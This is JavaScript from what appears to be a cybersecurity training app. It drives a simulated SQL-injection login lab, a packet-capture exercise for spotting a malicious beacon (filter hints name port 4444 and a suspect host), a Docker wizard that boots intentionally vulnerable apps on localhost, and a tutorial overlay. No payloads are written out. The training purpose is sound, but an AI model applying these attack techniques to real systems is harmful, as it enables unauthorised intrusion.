          responseEl.style.border = '1px solid rgba(239,68,68,0.4)';
          responseEl.style.color = '#f87171';
          responseEl.innerHTML = '<strong>Authentication Bypassed!</strong><br><br>Logged in as: <strong>admin@site.com</strong><br>Role: <strong>Administrator</strong><br>Token: eyJhbGciOiJSUzI1NiJ9...<br><br><em>The WHERE clause was broken by your injection.</em>';
        } else if (isValid) {
          responseEl.style.background = 'rgba(34,197,94,0.1)';
          responseEl.style.border = '1px solid rgba(34,197,94,0.4)';
          responseEl.style.color = '#4ade80';
          responseEl.innerHTML = '<strong>Login Successful</strong><br><br>Welcome back, normal@user.com<br>Role: user<br><br><em>This is a legitimate authentication — no injection.</em>';
        } else {
          responseEl.style.background = 'rgba(255,255,255,0.03)';
          responseEl.style.border = '1px solid var(--border)';
          responseEl.style.color = 'var(--text-secondary)';
          responseEl.innerHTML = '<strong>401 Unauthorized</strong><br><br>Invalid email or password.<br><br><em>Payload did not bypass authentication. Try a different injection.</em>';
        }
      }

      if (submitBtn) submitBtn.addEventListener('click', evalSQLi);
      if (emailIn) emailIn.addEventListener('keydown', e => { if (e.key === 'Enter') evalSQLi(); });
      if (passIn) passIn.addEventListener('keydown', e => { if (e.key === 'Enter') evalSQLi(); });
    }, 100);
  }

  // ── Network Traffic Analyst Simulator ───────────────────────────────────────
  if (mod.id === 'net-analyst') {
    const packetLabHtml = `
      <div class="section-card fade-in fade-in-delay-6" id="packetLabSection">
        <div class="section-header" style="background: rgba(34,211,238,0.05); border-bottom: 1px solid rgba(34,211,238,0.3);">
          <div class="section-icon concept">${LI.signal}</div>
          <h3 class="section-title" style="color: #22d3ee;">Live Packet Capture Simulator</h3>
        </div>
        <div class="section-body">
          <p>Analyze a simulated packet stream. Use the filter bar to isolate suspicious traffic. Click any packet to inspect it. <strong>Find the malicious beacon hidden in the traffic!</strong></p>
          <div style="display:flex; gap:10px; margin-top:16px; align-items:center; flex-wrap:wrap;">
            <input type="text" id="packetFilter" placeholder="Display filter (e.g.: http, dns, ip.dst==13.37.13.37, tcp.dstport==4444)" style="flex:1;min-width:200px;padding:7px 12px;background:var(--bg-deep);border:1px solid rgba(34,211,238,0.4);color:var(--text-primary);font-family:var(--font-mono);font-size:12px;border-radius:4px;outline:none;">
            <button id="packetFilterBtn" style="padding:7px 16px;background:rgba(34,211,238,0.15);border:1px solid rgba(34,211,238,0.4);color:#22d3ee;border-radius:4px;cursor:pointer;font-weight:700;">Apply</button>
            <button id="packetClearFilter" style="padding:7px 12px;background:rgba(255,255,255,0.05);border:1px solid var(--border);color:var(--text-secondary);border-radius:4px;cursor:pointer;">Clear</button>
            <button id="packetStartCapture" style="padding:7px 16px;background:linear-gradient(135deg,#22d3ee,#0ea5e9);color:#000;border:none;border-radius:4px;cursor:pointer;font-weight:700;">▶ Start Capture</button>
          </div>
          <div style="margin-top:12px; border:1px solid rgba(34,211,238,0.2); border-radius:var(--radius); overflow:hidden;">
            <div style="background:rgba(0,0,0,0.4); padding:6px 12px; display:grid; grid-template-columns:50px 90px 1fr 1fr 80px 60px; gap:8px; font-size:10px; color:var(--text-muted); text-transform:uppercase; letter-spacing:1px; border-bottom:1px solid rgba(255,255,255,0.05);">
              <span>No.</span><span>Time</span><span>Source</span><span>Destination</span><span>Protocol</span><span>Length</span>
            </div>
            <div id="packetList" style="height:240px; overflow-y:auto; background:var(--bg-deep);"></div>
          </div>
          <div style="display:grid; grid-template-columns:1fr 1fr; gap:14px; margin-top:14px;">
            <div>
              <div style="font-size:11px; color:var(--text-muted); margin-bottom:6px; text-transform:uppercase;">Packet Detail</div>
              <div id="packetDetail" style="background:var(--bg-deep); border:1px solid var(--border); border-radius:4px; padding:12px; font-family:var(--font-mono); font-size:11px; color:var(--text-secondary); height:130px; overflow-y:auto;">Click a packet to inspect it...</div>
            </div>
            <div>
              <div style="font-size:11px; color:var(--text-muted); margin-bottom:6px; text-transform:uppercase;">Analysis Result</div>
              <div id="packetAnalysis" style="background:var(--bg-deep); border:1px solid var(--border); border-radius:4px; padding:12px; font-size:12px; color:var(--text-secondary); height:130px; overflow-y:auto;">Select a suspicious packet to trigger analysis...</div>
            </div>
          </div>
        </div>
      </div>
    `;
    const challengesSection = document.getElementById('interactiveChallengesSection');
    if (challengesSection) {
      challengesSection.style.display = 'block';
      challengesSection.insertAdjacentHTML('afterend', packetLabHtml);
    } else {
      document.getElementById('contentArea').insertAdjacentHTML('beforeend', packetLabHtml);
    }
    setTimeout(() => window.__app.initPacketLab(), 100);
  }

  // Setup copy buttons
  attachCopyHandlers();
  contentArea.scrollTop = 0;
}

/* ═══════════════════════════════════════════════════════════════════════════════
   CODE BLOCK & COPY
   ═══════════════════════════════════════════════════════════════════════════════ */

function buildCodeBlock(lang, text) {
  const id = 'cb-' + Math.random().toString(36).substr(2, 8);
  return `
    <div class="code-wrapper">
      <div class="code-header">
        <span class="code-lang">${lang}</span>
        <button class="btn-copy" data-target="${id}" title="Copy to clipboard">
          ${ICONS.copy}
          <span>Copy</span>
        </button>
      </div>
      <pre class="code-block" id="${id}">${escapeHtml(text)}</pre>
    </div>
  `;
}

function attachCopyHandlers() {
  document.querySelectorAll('.btn-copy[data-target]').forEach(btn => {
    btn.addEventListener('click', async () => {
      const el = document.getElementById(btn.dataset.target);
      if (el) await copyToClipboard(el.textContent, btn);
    });
  });
  document.querySelectorAll('.cell-copy-btn[data-copy]').forEach(btn => {
    btn.addEventListener('click', async () => {
      await copyToClipboard(btn.dataset.copy, btn);
    });
  });
}

async function writeClipboard(text) {
  try {
    if (navigator.clipboard && navigator.clipboard.writeText) {
      await navigator.clipboard.writeText(text);
      return true;
    }
  } catch (e) { /* fall through to execCommand */ }
  try {
    const ta = document.createElement('textarea');
    ta.value = text;
    ta.style.position = 'fixed';
    ta.style.opacity = '0';
    document.body.appendChild(ta);
    ta.select();
    const ok = document.execCommand('copy');
    ta.remove();
    return ok;
  } catch (e) { return false; }
}

async function copyToClipboard(text, btnEl) {
  // Ignore clicks while the button is already showing its "copied" state,
  // otherwise the restore timer captures the wrong original markup.
  if (btnEl.dataset.copying === '1') return;
  const ok = await writeClipboard(text);
  if (!ok) { console.error('Copy failed'); return; }

  btnEl.dataset.copying = '1';
  const orig = btnEl.dataset.origHtml || btnEl.innerHTML;
  btnEl.dataset.origHtml = orig;
  btnEl.classList.add('copied');
  btnEl.innerHTML = btnEl.classList.contains('btn-copy')
    ? `${ICONS.check}<span>Copied!</span>`
    : ICONS.check;
  setTimeout(() => {
    btnEl.classList.remove('copied');
    btnEl.innerHTML = btnEl.dataset.origHtml;
    delete btnEl.dataset.copying;
    delete btnEl.dataset.origHtml;
  }, 1800);
}

/* ═══════════════════════════════════════════════════════════════════════════════
   DOCKER WIZARD
   ═══════════════════════════════════════════════════════════════════════════════ */

async function checkDockerInstallation() {
  try {
    const result = await window.labAPI.checkDocker();
    dockerInstalled = result.installed;

    if (result.installed) {
      dockerMount.innerHTML = `
        <div class="docker-success">
          ${ICONS.check}
          <span>Docker detected — ${escapeHtml(result.version)}</span>
        </div>
      `;
      setTimeout(() => { dockerMount.innerHTML = ''; }, 4000);
    } else {
      showDockerWizard(result.platform);
    }
  } catch (e) {
    showDockerWizard('unknown');
  }
}

function showDockerWizard(platform) {
  const platformName =
    platform === 'win32' ? 'Windows' :
    platform === 'darwin' ? 'macOS' : 'Linux';

  const platformSteps =
    platform === 'win32' ? `
      <li><div class="dw-num">1</div><span>Click <strong>"Download Docker Desktop"</strong> below — it opens the official installer download.</span></li>
      <li><div class="dw-num">2</div><span>Run the downloaded <strong>Docker Desktop Installer.exe</strong> and follow the prompts.</span></li>
      <li><div class="dw-num">3</div><span>Restart your computer when prompted.</span></li>
      <li><div class="dw-num">4</div><span>Launch <strong>Docker Desktop</strong> from the Start menu and wait for it to start (whale icon in system tray turns steady).</span></li>
      <li><div class="dw-num">5</div><span>Click <strong>"Re-check Docker"</strong> below to verify the installation.</span></li>
    ` : platform === 'darwin' ? `
      <li><div class="dw-num">1</div><span>Click <strong>"Download Docker Desktop"</strong> below — it downloads the DMG installer.</span></li>
      <li><div class="dw-num">2</div><span>Open the DMG and drag Docker to your Applications folder.</span></li>
      <li><div class="dw-num">3</div><span>Launch Docker from Applications and grant the necessary permissions.</span></li>
      <li><div class="dw-num">4</div><span>Wait for the Docker icon in the menu bar to show "Docker Desktop is running".</span></li>
      <li><div class="dw-num">5</div><span>Click <strong>"Re-check Docker"</strong> below to verify the installation.</span></li>
    ` : `
      <li><div class="dw-num">1</div><span>Click <strong>"Open Install Guide"</strong> — it opens the official Docker Engine install docs for your distro.</span></li>
      <li><div class="dw-num">2</div><span>Follow the instructions for your Linux distribution (Ubuntu, Debian, Fedora, etc.).</span></li>
      <li><div class="dw-num">3</div><span>Add your user to the docker group: <code>sudo usermod -aG docker $USER</code></span></li>
      <li><div class="dw-num">4</div><span>Log out and back in for group changes to take effect.</span></li>
      <li><div class="dw-num">5</div><span>Verify with <code>docker run hello-world</code>, then click <strong>"Re-check Docker"</strong> below.</span></li>
    `;

  const downloadLabel = platform === 'linux' ? 'Open Install Guide' : 'Download Docker Desktop';

  dockerMount.innerHTML = `
    <div class="docker-wizard">
      <div class="docker-wizard-header">
        <div class="docker-wizard-icon">${ICONS.docker}</div>
        <h3 class="docker-wizard-title">Docker Not Found — Setup Required</h3>
      </div>
      <p class="docker-wizard-desc">
        The Lab Control Panel requires <strong>Docker</strong> to run vulnerable target applications (Juice Shop & DVWA) locally.
        Docker is free and takes about 5 minutes to install. Detected platform: <strong>${platformName}</strong>.
      </p>
      <ul class="docker-wizard-steps">${platformSteps}</ul>
      <div class="docker-wizard-actions">
        <button class="btn btn-docker-dl" onclick="window.__app.downloadDocker()">
          <svg class="btn-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
          <span>${downloadLabel}</span>
        </button>
        <button class="btn btn-docker-recheck" onclick="window.__app.recheckDocker()">
          <svg class="btn-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="23 4 23 10 17 10"/><polyline points="1 20 1 14 7 14"/><path d="M3.51 9a9 9 0 0 1 14.85-3.36L23 10M1 14l4.64 4.36A9 9 0 0 0 20.49 15"/></svg>
          <span>Re-check Docker</span>
        </button>
      </div>
    </div>
  `;
}

async function downloadDocker() {
  try {
    await window.labAPI.downloadDocker();
    labMessage.textContent = 'Docker download opened in your browser. Install it, then click Re-check.';
  } catch (e) {
    console.error('Download Docker error:', e);
  }
}

async function recheckDocker() {
  labMessage.textContent = 'Checking for Docker installation...';
  await checkDockerInstallation();
  if (dockerInstalled) {
    labMessage.textContent = 'Docker is installed and ready! You can now Boot the Lab.';
  } else {
    labMessage.textContent = 'Docker still not detected. Please complete the installation and try again.';
  }
}

/* ═══════════════════════════════════════════════════════════════════════════════
   LAB CONTROL PANEL
   ═══════════════════════════════════════════════════════════════════════════════ */

async function handleBoot() {
  if (isBooting) return;

  if (dockerInstalled === false) {
    showError('Docker is not installed. Please follow the setup wizard above to install Docker first.');
    return;
  }

  isBooting = true;
  btnBoot.classList.add('loading');
  btnBootText.innerHTML = 'Downloading Lab Assets<span class="loading-dots"></span>';
  labMessage.textContent = 'Pulling Docker images & starting containers — this may take a few minutes on first run...';
  clearError();

  try {
    const results = await window.labAPI.bootLab();
    handleLabResults(results, 'booted');
  } catch (err) {
    showError('Unexpected error while booting the lab: ' + err.message);
  } finally {
    isBooting = false;
    btnBoot.classList.remove('loading');
    btnBootText.textContent = 'Boot Lab';
  }
}

async function handleStop() {
  const btnRestart = document.getElementById('btnRestart');
  if (btnRestart) btnRestart.style.display = 'none';

  labMessage.textContent = 'Stopping lab containers...';
  try {
    const results = await window.labAPI.stopLab();
    handleLabResults(results, 'stopped');
  } catch (err) {
    showError('Unexpected error while stopping the lab: ' + err.message);
  }
}

async function handleRestart() {
  const btnRestart = document.getElementById('btnRestart');
  if (btnRestart) {
    btnRestart.querySelector('span').textContent = 'Restarting...';
    btnRestart.classList.add('loading');
    btnRestart.disabled = true;
  }
  
  // Reset overlay progress so Juice Shop and UI are completely fresh
  localStorage.removeItem('cybercompanion_progress');
  if (window.__overlay && window.__overlay.stateManager && window.__overlay.renderer) {
    window.__overlay.stateManager.solvedChallenges.clear();
    window.__overlay.stateManager.totalXP = 0;
    window.__overlay.stateManager.recalculateLevel();
    const overlayContentEl = document.getElementById('overlayContent');
    if (overlayContentEl) {
      window.__overlay.renderer.renderDashboard();
    }
  }

  await handleStop();
  await handleBoot();
  
  if (btnRestart) {
    btnRestart.querySelector('span').textContent = 'Restart Lab';
    btnRestart.classList.remove('loading');
    btnRestart.disabled = false;
  }
}

async function handleRefresh() {
  labMessage.textContent = 'Checking container status...';
  try {
    const status = await window.labAPI.getStatus();
    updateStatusChips(status);
    labMessage.textContent = 'Status refreshed.';
  } catch (err) {
    showError('Could not check status: ' + err.message);
  }
}

let juiceShopPoll = null;

function handleLabResults(results, action) {
  if (results && results.busy) {
    labMessage.textContent = results.busy.error || 'A lab operation is already running.';
    return;
  }

  const errors = [];
  for (const [, result] of Object.entries(results || {})) {
    if (result && !result.ok && result.error) {
      if (result.error === 'DOCKER_NOT_FOUND') {
        showDockerWizard('unknown');
        dockerInstalled = false;
        labMessage.textContent = 'Docker is not installed. Follow the setup wizard above.';
        return;
      }
      errors.push(`${result.label}: ${result.error}`);
    }
  }

  if (errors.length > 0) {
    showError(errors.join('\n'));
    labMessage.textContent = 'Lab encountered errors — see details below.';
  } else {
    labMessage.textContent = `Lab containers ${action} successfully.`;
    clearError();
    const btnRestart = document.getElementById('btnRestart');
    if (action === 'booted') {
      if (btnRestart) btnRestart.style.display = 'inline-flex';

      if (isLabMode && webviewEl) {
        labMessage.textContent = 'Waiting for Juice Shop to initialize...';
        if (juiceShopPoll) clearInterval(juiceShopPoll);
        let attempts = 0;
        const MAX_ATTEMPTS = 40; // ~60s at 1.5s intervals
        juiceShopPoll = setInterval(() => {
          attempts++;
          if (attempts > MAX_ATTEMPTS) {
            clearInterval(juiceShopPoll);
            juiceShopPoll = null;
            labMessage.textContent = 'Juice Shop is taking longer than expected. Click Refresh once it is up.';
            return;
          }
          fetch('http://localhost:3000', { mode: 'no-cors' })
            .then(() => {
              clearInterval(juiceShopPoll);
              juiceShopPoll = null;
              labMessage.textContent = 'Lab is ready!';
              webviewEl.reload();
            })
            .catch(() => {});
        }, 1500);
      } else {
        window.labAPI.openUrl('http://localhost:3000');
        setTimeout(() => window.labAPI.openUrl('http://localhost:8080'), 500);
      }
    }
  }
  setTimeout(() => handleRefresh(), 2500);
}

function updateStatusChips(status) {
  for (const [key, info] of Object.entries(status)) {
    const chipId = key === 'juiceshop' ? 'statusJuiceshop' : 'statusDvwa';
    const chip = document.getElementById(chipId);
    if (!chip) continue;
    const dot = chip.querySelector('.status-dot');
    dot.className = 'status-dot';
    if (info.error && info.error !== 'DOCKER_NOT_FOUND') dot.classList.add('error');
    else if (info.running) dot.classList.add('online');
    else dot.classList.add('offline');
  }
}

function showError(message) {
  clearError();
  const banner = document.createElement('div');
  banner.className = 'error-banner';
  banner.id = 'labErrorBanner';
  banner.innerHTML = `
    <div class="error-banner-icon">${ICONS.error}</div>
    <div class="error-banner-text">${escapeHtml(message)}</div>
  `;
  labStatusRow.after(banner);
}

function clearError() {
  const el = document.getElementById('labErrorBanner');
  if (el) el.remove();
}

/* ═══════════════════════════════════════════════════════════════════════════════
   LAB MODE — Webview + Overlay
   ═══════════════════════════════════════════════════════════════════════════════ */

let isLabMode = false;
let labModeInitialized = false;
let overlayPanelCollapsed = false;
let isCyberMartMode = false;
let pendingCyberMartProxyId = null;

const labModeEl       = document.getElementById('labMode');
const contentAreaEl   = document.getElementById('contentArea');
const labPanelEl      = document.getElementById('labPanel');
const webviewEl       = document.getElementById('juiceshopView');
const cyberMartView   = document.getElementById('cyberMartView');
const webviewLoading  = document.getElementById('webviewLoading');
const btnLabModeText  = document.getElementById('btnLabModeText');
const overlayPanel    = document.getElementById('overlayPanel');
const overlayToggle   = document.getElementById('overlayToggle');

function toggleLabMode() {
  isLabMode = !isLabMode;

  if (isLabMode) {
    // Switch to Lab Mode
    stopSocSimulator();
    contentAreaEl.style.display = 'none';
    document.getElementById('socMode').style.display = 'none';
    labModeEl.style.display = 'flex';
    btnLabModeText.textContent = 'Study Mode';
    document.getElementById('btnLabMode').classList.add('active');

    // Initialize webview on first entry
    if (!labModeInitialized) {
      initLabMode();
      labModeInitialized = true;
    }
    
    // Auto-boot if not online
    const juiceStatus = document.getElementById('statusJuiceshop');
    if (juiceStatus) {
      const dot = juiceStatus.querySelector('.status-dot');
      if (dot && !dot.classList.contains('online') && !isBooting && window.__app.handleBoot) {
        window.__app.handleBoot();
      }
    }
  } else {
    // Switch back to Study Mode
    labModeEl.style.display = 'none';
    contentAreaEl.style.display = '';
    btnLabModeText.textContent = 'Enter Lab Mode';
    document.getElementById('btnLabMode').classList.remove('active');
  }
}

function initLabMode(targetUrl) {
  // Determine absolute path to the preload script
  // The webview preload is assigned by main.js (will-attach-webview), not by the page.

  // Load the target — defaults to Juice Shop, but can be CyberMart
  webviewEl.src = targetUrl || 'http://localhost:3000';

  // Show loading overlay
  webviewLoading.style.display = 'flex';

  let didFail = false;

  webviewEl.addEventListener('did-fail-load', (_event) => {
    didFail = true;
    webviewLoading.style.display = 'flex';
    webviewLoading.querySelector('.webview-loading-text').textContent =
      'Failed to load Juice Shop. Booting the lab...';
    webviewLoading.querySelector('.webview-loading-spinner').style.display = 'block';
  });

  // Hide loading when the page finishes loading
  webviewEl.addEventListener('did-finish-load', () => {
    if (!didFail) {
      webviewLoading.style.display = 'none';
    }
    didFail = false;
  });

  // Initialize the overlay system if overlay.js is loaded
  if (window.__overlay) {
    window.__overlay.init(webviewEl);
  }

  const btnDevTools = document.getElementById('btnDevTools');
  if (btnDevTools) {
    btnDevTools.onclick = () => {
      if (webviewEl.isDevToolsOpened()) {
        webviewEl.closeDevTools();
      } else {
        webviewEl.openDevTools();
      }
    };
  }
}

function toggleOverlayPanel() {
  overlayPanelCollapsed = !overlayPanelCollapsed;

  if (overlayPanelCollapsed) {
    overlayPanel.classList.add('collapsed');
    overlayToggle.querySelector('svg').innerHTML = '<polyline points="9 18 15 12 9 6"/>';
  } else {
    overlayPanel.classList.remove('collapsed');
    overlayToggle.querySelector('svg').innerHTML = '<polyline points="15 18 9 12 15 6"/>';
  }
}

function startTutorial(tutorialKey) {
  if (!window.TUTORIALS || !window.TUTORIALS[tutorialKey]) {
    alert("Tutorial not found!");
    return;
  }
  
  const tut = window.TUTORIALS[tutorialKey];
  
  // ── Standalone Lab Launchers ──────────────────────────────────────────────
  if (tut.requiresCyberMart) {
    if (window.labAPI && window.labAPI.openBurpLab) window.labAPI.openBurpLab();
    return;
  }
  if (tut.requiresPriceTampering) {
    if (window.labAPI && window.labAPI.openPriceTamperingLab) window.labAPI.openPriceTamperingLab();
    return;
  }
  if (tut.requiresCookieManipulation) {
    if (window.labAPI && window.labAPI.openCookieManipulationLab) window.labAPI.openCookieManipulationLab();
    return;
  }
  if (tut.requiresHeaderManipulation) {
    if (window.labAPI && window.labAPI.openHeaderManipulationLab) window.labAPI.openHeaderManipulationLab();
    return;
  }
  if (tut.requiresSQLiLab) {
    if (window.labAPI && window.labAPI.openSQLiLab) window.labAPI.openSQLiLab();
    return;
  }

  if (!tut.steps || !Array.isArray(tut.steps) || tut.steps.length === 0) {
    return;
  }

  isCyberMartMode = false;
  webviewEl.style.display = 'block';
  cyberMartView.style.display = 'none';
  // ── Standard Lab / Study Mode toggling ────────────────────────────────────
  // Integrated tutorials target built-in simulator elements inside contentArea.
  // If currently in lab mode (Juice Shop), exit it so the user can interact with the integrated system.
  if (!tut.requiresWebview && isLabMode) {
    toggleLabMode();
  }
  // If a task specifically requires the Juice Shop webview, launch lab mode.
  if (tut.requiresWebview && !isLabMode) {
    toggleLabMode();
  }

  // Auto-scroll to integrated simulator section if available
  setTimeout(() => {
    const simSec = document.getElementById(tut.module + 'LabSection') || 
                   document.getElementById(tut.module + 'TerminalSection') ||
                   document.getElementById(tut.module + 'Section');
    if (simSec) {
      simSec.scrollIntoView({ behavior: 'smooth', block: 'start' });
    }
  }, 100);
  
  const tutorialCSS = `
    #cyber-tut-backdrop {
      position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
      background: rgba(0, 0, 0, 0.65); z-index: 999990;
      pointer-events: none;
      display: block; transition: clip-path 0.4s ease;
    }
    #cyber-tut-bubble {
      position: fixed; z-index: 999999;
      background: linear-gradient(135deg, rgba(10, 14, 23, 0.97), rgba(17, 24, 39, 0.97));
      border: 2px solid rgba(0, 240, 255, 0.5);
      border-radius: 12px; padding: 20px 24px;
      color: #e2e8f0; font-family: 'IBM Plex Sans', 'Segoe UI', sans-serif;
      font-size: 14px;
      box-shadow: 0 12px 40px rgba(0,0,0,0.6), 0 0 30px rgba(0,240,255,0.15);
      max-width: 340px; min-width: 240px;
      pointer-events: auto;
    }
    #cyber-tut-bubble .tut-step-badge {
      display: inline-block; font-weight: 700; color: #00f0ff;
      font-size: 11px; text-transform: uppercase; letter-spacing: 1.5px;
      margin-bottom: 10px; padding: 3px 8px;
      background: rgba(0,240,255,0.1); border-radius: 4px;
    }
    #cyber-tut-bubble .tut-text {
      line-height: 1.6; font-size: 14px; color: #cbd5e1;
    }
    #cyber-tut-bubble .tut-skip-btn {
      margin-top: 14px; display: flex; gap: 8px;
    }
    #cyber-tut-bubble .tut-btn {
      flex: 1; padding: 8px 12px; border-radius: 6px; cursor: pointer;
      font-size: 12px; font-weight: 600; text-align: center; border: none;
      transition: all 0.15s ease;
    }
    #cyber-tut-bubble .tut-btn-primary {
      background: rgba(0,240,255,0.15); border: 1px solid #00f0ff; color: #00f0ff;
    }
    #cyber-tut-bubble .tut-btn-primary:hover { background: rgba(0,240,255,0.25); }
    #cyber-tut-bubble .tut-btn-secondary {
      background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.15); color: #94a3b8;
    }
    #cyber-tut-bubble .tut-btn-secondary:hover { background: rgba(255,255,255,0.1); color: #e2e8f0; }
    .cyber-tut-highlight {
      position: relative !important; z-index: 999995 !important;
      box-shadow: 0 0 0 4px rgba(0,240,255,0.4), 0 0 20px rgba(0,240,255,0.2) !important;
      border-radius: 4px;
    }
    #cyber-tut-arrow {
      position: fixed; z-index: 999998;
      width: 0; height: 0; pointer-events: none;
    }
  `;
  
  // Double-encode steps: JSON.stringify twice produces a safe JS string literal
  // (no backticks can escape the template literal), then JSON.parse inside the
  // injected code decodes it back to the original array.
  const safeStepsLiteral = JSON.stringify(JSON.stringify(tut.steps));

  const tutorialEngineCode = `
(function() {
  if (window.__cyberTutorialEngine) {
    window.__cyberTutorialEngine.play(JSON.parse(${safeStepsLiteral}));
    return;
  }

  var backdrop = document.createElement('div');
  backdrop.id = 'cyber-tut-backdrop';
  document.body.appendChild(backdrop);

  var bubble = document.createElement('div');
  bubble.id = 'cyber-tut-bubble';
  bubble.style.display = 'none';
  document.body.appendChild(bubble);

  var engine = {
    steps: [],
    current: 0,
    retryCount: 0,
    maxRetries: 20,
    active: false,

    cleanupListeners: function() {
      if (this._cleanup) { try { this._cleanup(); } catch (e) {} this._cleanup = null; }
    },

    play: function(steps) {
      this.cleanupListeners();
      this.steps = steps;
      this.current = 0;
      this.active = true;
      this.retryCount = 0;
      backdrop.style.display = 'block';
      this.showStep();
    },

    stop: function() {
      this.active = false;
      this.cleanupListeners();
      backdrop.style.display = 'none';
      bubble.style.display = 'none';
      this.clearHighlight();
    },

    clearHighlight: function() {
      var els = document.querySelectorAll('.cyber-tut-highlight');
      for (var i = 0; i < els.length; i++) {
        els[i].classList.remove('cyber-tut-highlight');
      }
      try {
        var frame = document.getElementById('cyberMartView');
        if (frame && frame.contentWindow && frame.contentWindow.document) {
          var fEls = frame.contentWindow.document.querySelectorAll('.cyber-tut-highlight');
          for (var j = 0; j < fEls.length; j++) {
            fEls[j].classList.remove('cyber-tut-highlight');
          }
        }
      } catch(e) { }
      backdrop.style.clipPath = 'none';
    },

    showStep: function() { var self = this;
      if (this.current >= this.steps.length) {
        bubble.innerHTML = '<div class="tut-step-badge">Tutorial Complete!</div>' +
          '<div class="tut-text">Congratulations! You have completed the tutorial.</div>' +
          '<div class="tut-skip-btn"><button class="tut-btn tut-btn-primary" id="tut-done-btn">Done</button></div>';
        bubble.style.display = 'block';
        bubble.style.top = '50%';
        bubble.style.left = '50%';
        bubble.style.transform = 'translate(-50%, -50%)';
        document.getElementById('tut-done-btn').onclick = function() { self.stop(); };
        return;
      }

      var step = this.steps[this.current];
      this.clearHighlight();

      var target = null;
      var inIframe = false;
      var frameOffset = { top: 0, left: 0 };

      if (step.selector === 'body') {
        target = document.body;
      } else if (step.selector.startsWith('iframe:')) {
        inIframe = true;
        var frame = document.getElementById('cyberMartView');
        try {
          if (frame && frame.contentWindow && frame.contentWindow.document) {
            target = frame.contentWindow.document.querySelector(step.selector.substring(7));
            var rect = frame.getBoundingClientRect();
            frameOffset = { top: rect.top, left: rect.left };
            
            if (target && !frame.contentWindow.document.getElementById('cyber-tut-styles-iframe')) {
              var s = frame.contentWindow.document.createElement('style');
              s.id = 'cyber-tut-styles-iframe';
              s.textContent = '.cyber-tut-highlight { position: relative !important; z-index: 999995 !important; box-shadow: 0 0 0 4px rgba(0,240,255,0.4), 0 0 20px rgba(0,240,255,0.2) !important; border-radius: 4px; }';
              frame.contentWindow.document.head.appendChild(s);
            }
          }
        } catch(e) {
          target = null;
        }
      } else {
        target = document.querySelector(step.selector);
      }

      if (!target) {
        this.retryCount++;
        if (this.retryCount < this.maxRetries) {
          setTimeout(function() { if (self.active) self.showStep(); }, 500);
        } else {
          this.retryCount = 0;
          this.current++;
          this.showStep();
        }
        return;
      }
      this.retryCount = 0;

      if (target !== document.body) {
        target.classList.add('cyber-tut-highlight');
        if (!inIframe) {
          target.scrollIntoView({ behavior: 'smooth', block: 'center' });
        } else {
          target.scrollIntoView({ behavior: 'smooth', block: 'center' });
        }

        setTimeout(function() {
          var rect = target.getBoundingClientRect();
          var pad = 6;
          var top = rect.top + frameOffset.top - pad;
          var left = rect.left + frameOffset.left - pad;
          var right = rect.right + frameOffset.left + pad;
          var bottom = rect.bottom + frameOffset.top + pad;
          
          backdrop.style.clipPath = 'polygon(' +
            '0% 0%, 0% 100%, ' +
            left + 'px 100%, ' +
            left + 'px ' + top + 'px, ' +
            right + 'px ' + top + 'px, ' +
            right + 'px ' + bottom + 'px, ' +
            left + 'px ' + bottom + 'px, ' +
            left + 'px 100%, ' +
            '100% 100%, 100% 0%)';
        }, 100);
      } else {
        backdrop.style.clipPath = 'none';
      }

      // Render bubble content
      bubble.style.transform = 'none';
      bubble.innerHTML =
        '<div class="tut-step-badge">Step ' + (this.current + 1) + ' of ' + this.steps.length + '</div>' +
        '<div class="tut-text">' + step.text + '</div>' +
        '<div class="tut-skip-btn">' +
          '<button class="tut-btn tut-btn-secondary" id="tut-skip-btn">Skip</button>' +
          '<button class="tut-btn tut-btn-primary" id="tut-next-btn">Next</button>' +
        '</div>';
      bubble.style.display = 'block';

      document.getElementById('tut-skip-btn').onclick = function() { self.stop(); };
      document.getElementById('tut-next-btn').onclick = function() { self.advance(); };

      // Position the bubble near the target
      setTimeout(function() {
        var tRect = target.getBoundingClientRect();
        var bRect = bubble.getBoundingClientRect();

        var tTop = tRect.top + frameOffset.top;
        var tBottom = tRect.bottom + frameOffset.top;
        var tLeft = tRect.left + frameOffset.left;
        var tRight = tRect.right + frameOffset.left;

        var bTop, bLeft;
        var pos = step.position || 'bottom';

        if (target === document.body || pos === 'center') {
          bTop = window.innerHeight / 2 - bRect.height / 2;
          bLeft = window.innerWidth / 2 - bRect.width / 2;
        } else if (pos === 'right') {
          bTop = tTop;
          bLeft = tRight + 14;
        } else if (pos === 'left') {
          bTop = tTop;
          bLeft = tLeft - bRect.width - 14;
        } else if (pos === 'top') {
          bTop = tTop - bRect.height - 14;
          bLeft = tLeft;
        } else {
          // bottom (default)
          bTop = tBottom + 14;
          bLeft = tLeft;
        }

        // Clamp to viewport
        if (bLeft + bRect.width > window.innerWidth - 10) bLeft = window.innerWidth - bRect.width - 10;
        if (bTop + bRect.height > window.innerHeight - 10) bTop = tTop - bRect.height - 14;
        if (bLeft < 10) bLeft = 10;
        if (bTop < 10) bTop = 10;

        bubble.style.top = bTop + 'px';
        bubble.style.left = bLeft + 'px';
      }, 150);

      // Also listen for user performing the action to auto-advance
      if (step.action === 'click' && target !== document.body) {
        var clickHandler = function() {
          target.removeEventListener('click', clickHandler);
          self.advance();
        };
        target.addEventListener('click', clickHandler);
        this._cleanup = function() { target.removeEventListener('click', clickHandler); };
      } else if (step.action === 'input' && target !== document.body) {
        var inputHandler = function() {
          var val = (target.value || '').trim();
          var want = String(step.waitForValue || '').trim();
          var matched = target.tagName === 'TEXTAREA' ? val.indexOf(want) !== -1 : val === want;
          if (want && matched) {
            target.removeEventListener('input', inputHandler);
            self.advance();
          }
        };
        target.addEventListener('input', inputHandler);
        this._cleanup = function() { target.removeEventListener('input', inputHandler); };
      } else if (step.action === 'enter' && target !== document.body) {
        var keydownHandler = function(e) {
          if (e.key === 'Enter') {
            target.removeEventListener('keydown', keydownHandler);
            // Give a tiny delay so the actual enter command triggers first
            setTimeout(function() { self.advance(); }, 50);
          }
        };
        target.addEventListener('keydown', keydownHandler);
